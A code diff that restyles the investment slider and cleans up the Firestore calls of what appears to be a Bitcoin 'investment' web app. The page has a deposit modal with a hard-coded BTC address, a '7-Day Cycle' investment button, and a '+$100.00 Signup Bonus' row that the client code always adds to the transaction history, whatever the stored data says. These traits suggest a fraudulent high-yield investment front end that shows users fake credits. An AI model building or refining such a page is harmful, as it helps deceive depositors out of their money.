@@ -31,42 +31,36 @@
             box-shadow: 0 10px 20px rgba(34, 211, 238, 0.3); text-decoration: none;
         }
 
-        /* --- PROFESSIONAL SLIDER STYLING --- */
+        /* --- ADVANCED DYNAMIC SLIDER --- */
         input[type=range] {
             -webkit-appearance: none;
             width: 100%;
             background: transparent;
         }
 
-        /* The Track (The Bar) */
         input[type=range]::-webkit-slider-runnable-track {
             width: 100%;
             height: 8px;
             cursor: pointer;
-            background: linear-gradient(90deg, #22d3ee 0%, rgba(34, 211, 238, 0.1) 100%);
+            /* Default background - will be overridden by JS */
+            background: rgba(255,255,255,0.1); 
             border-radius: 10px;
             border: 1px solid rgba(255, 255, 255, 0.05);
         }
 
-        /* The Thumb (The Knob) */
         input[type=range]::-webkit-slider-thumb {
-            height: 20px;
-            width: 20px;
+            height: 22px;
+            width: 22px;
             border-radius: 50%;
             background: #ffffff;
             cursor: pointer;
             -webkit-appearance: none;
-            margin-top: -7px; /* Centers thumb on the track */
-            box-shadow: 0 0 15px rgba(34, 211, 238, 0.5);
-            border: 2px solid #22d3ee;
+            margin-top: -8px;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
+            border: 2px solid #22d3ee; /* Color updated via JS */
+            transition: border-color 0.3s ease;
         }
-
-        input[type=range]:focus::-webkit-slider-runnable-track {
-            background: linear-gradient(90deg, #22d3ee 0%, rgba(34, 211, 238, 0.2) 100%);
-        }
-        /* --- END SLIDER STYLING --- */
-
-        input[type=number]::-webkit-inner-spin-button { -webkit-appearance: none; }
+        /* --- END SLIDER --- */
     </style>
 </head>
 <body class="p-6 pb-24">
@@ -74,7 +68,7 @@
     <div id="depositModal">
         <div class="glass w-full max-w-sm rounded-[32px] p-8 text-center">
             <h3 class="text-xl font-black uppercase mb-4">Bitcoin Deposit</h3>
-            <div class="bg-black/40 border border-white/5 rounded-2xl p-4 mb-6">
+            <div class="bg-black/40 border border-white/5 rounded-2xl p-4 mb-6 text-center">
                 <p class="text-[11px] font-mono text-gray-400 break-all mb-3">Bc1qgf7ruqy6y8pkyzsspxq38j53puny0aprujph28</p>
                 <button onclick="navigator.clipboard.writeText('Bc1qgf7ruqy6y8pkyzsspxq38j53puny0aprujph28');alert('Copied!')" class="w-full py-2 bg-white/5 rounded-xl text-[10px] font-black uppercase">Copy Address</button>
             </div>
@@ -105,7 +99,7 @@
     <div class="glass rounded-[40px] p-8 mb-6">
         <div class="flex justify-between items-center mb-8">
             <h3 class="font-black text-lg uppercase">Invest</h3>
-            <span class="bg-cyan-400/10 text-cyan-400 text-[9px] px-3 py-1.5 rounded-full font-black tracking-widest">+ $100 BONUS APPLIED</span>
+            <span id="bonusTag" class="bg-cyan-400/10 text-cyan-400 text-[9px] px-3 py-1.5 rounded-full font-black tracking-widest transition-colors duration-500">+ $100 BONUS APPLIED</span>
         </div>
         <div class="space-y-6">
             <div>
@@ -118,9 +112,9 @@
             <div class="bg-white/5 border border-white/10 rounded-[24px] p-6">
                 <input type="number" id="manualInvest" value="500" class="bg-transparent w-full text-xl font-bold outline-none" oninput="updateInvest(this.value)">
             </div>
-            <div class="bg-cyan-400/5 border border-cyan-400/10 rounded-[24px] p-6 flex justify-between items-center">
+            <div class="bg-cyan-400/5 border border-cyan-400/10 rounded-[24px] p-6 flex justify-between items-center transition-colors duration-500" id="totalPowerCard">
                 <p class="text-[10px] text-gray-400 font-black uppercase">Total Power:</p>
-                <p class="text-xl font-black text-cyan-400">$<span id="totalPower">600.00</span></p>
+                <p class="text-xl font-black text-cyan-400 transition-colors duration-500" id="powerDisplay">$<span id="totalPower">600.00</span></p>
             </div>
             <div class="flex gap-3">
                 <button onclick="processInvestment()" class="flex-[2] py-6 bg-white text-black rounded-[24px] font-black uppercase text-xs">Start 7-Day Cycle</button>
@@ -152,29 +146,56 @@
         const db = firebase.firestore();
 
         function updateInvest(val) {
-            document.getElementById('sliderVal').innerText = val;
-            document.getElementById('investSlider').value = val;
-            document.getElementById('manualInvest').value = val;
-            document.getElementById('totalPower').innerText = (parseFloat(val) + 100).toFixed(2);
+            const numVal = parseFloat(val);
+            document.getElementById('sliderVal').innerText = numVal.toLocaleString();
+            document.getElementById('investSlider').value = numVal;
+            document.getElementById('manualInvest').value = numVal;
+            document.getElementById('totalPower').innerText = (numVal + 100).toFixed(2);
+
+            // DYNAMIC COLOR LOGIC
+            const slider = document.getElementById('investSlider');
+            const bonusTag = document.getElementById('bonusTag');
+            const powerDisp = document.getElementById('powerDisplay');
+            const powerCard = document.getElementById('totalPowerCard');
+
+            // Calculate percentage (0 to 100)
+            const percent = (numVal - 500) / (20000 - 500) * 100;
+            
+            // Professional Gradient Shift (Cyan to Gold)
+            let color = "#22d3ee"; // Cyan
+            if (percent > 50) {
+                // Blend toward Gold (#fbbf24)
+                color = "#fbbf24";
+                bonusTag.style.color = "#fbbf24";
+                bonusTag.style.background = "rgba(251, 191, 36, 0.1)";
+                powerDisp.style.color = "#fbbf24";
+                powerCard.style.borderColor = "rgba(251, 191, 36, 0.2)";
+                slider.style.setProperty('--thumb-color', color);
+            } else {
+                bonusTag.style.color = "#22d3ee";
+                bonusTag.style.background = "rgba(34, 211, 238, 0.1)";
+                powerDisp.style.color = "#22d3ee";
+                powerCard.style.borderColor = "rgba(34, 211, 238, 0.1)";
+            }
+
+            slider.style.background = `linear-gradient(90deg, ${color} ${percent}%, rgba(255,255,255,0.1) ${percent}%)`;
         }
+
+        // Initialize Slider
+        updateInvest(500);
 
         async function processInvestment() {
             const amount = parseFloat(document.getElementById('manualInvest').value);
             const user = auth.currentUser;
-            const userRef = db.collection("users").doc(user.uid);
-            const doc = await userRef.get();
+            const doc = await db.collection("users").doc(user.uid).get();
             
-            if (doc.data().balance < amount) return alert("Insufficient Balance");
+            if ((doc.data().balance || 0) < amount) return alert("Insufficient Balance");
 
-            await userRef.update({ balance: firebase.firestore.FieldValue.increment(-amount) });
-            await userRef.collection("transactions").add({
-                type: "7-Day Cycle Started",
-                amount: amount,
-                status: "active",
-                date: "MAR 2026",
-                createdAt: new Date().getTime()
+            await db.collection("users").doc(user.uid).update({ balance: firebase.firestore.FieldValue.increment(-amount) });
+            await db.collection("users").doc(user.uid).collection("transactions").add({
+                type: "7-Day Cycle Started", amount: amount, status: "active", date: "MAR 2026", createdAt: new Date().getTime()
             });
-            alert("Cycle Started Successfully!");
+            alert("Investment Active!");
         }
 
         function handleDone() {
@@ -195,13 +216,6 @@
                 db.collection("users").doc(user.uid).collection("transactions").orderBy("createdAt", "desc").onSnapshot(snap => {
                     const box = document.getElementById('txHistory');
                     box.innerHTML = "";
-                    
-                    const bonusHTML = `
-                        <div class="flex justify-between items-center">
-                            <div><p class="font-bold text-sm text-white">Signup Bonus</p><p class="text-gray-500 text-[9px] font-black uppercase">MAR 2026</p></div>
-                            <p class="text-cyan-400 font-black text-sm">+$100.00</p>
-                        </div>`;
-
                     snap.forEach(doc => {
                         const tx = doc.data();
                         const isP = tx.status === 'pending';
@@ -211,7 +225,7 @@
                                 <p class="${isP ? 'text-gray-400' : 'text-cyan-400'} font-black text-sm">$${tx.amount.toLocaleString()}</p>
                             </div>`;
                     });
-                    box.innerHTML += bonusHTML;
+                    box.innerHTML += `<div class="flex justify-between items-center"><div><p class="font-bold text-sm text-white">Signup Bonus</p><p class="text-gray-500 text-[9px] font-black uppercase">MAR 2026</p></div><p class="text-cyan-400 font-black text-sm">+$100.00</p></div>`;
                 });
             } else { location.href = "index.html"; }
         });
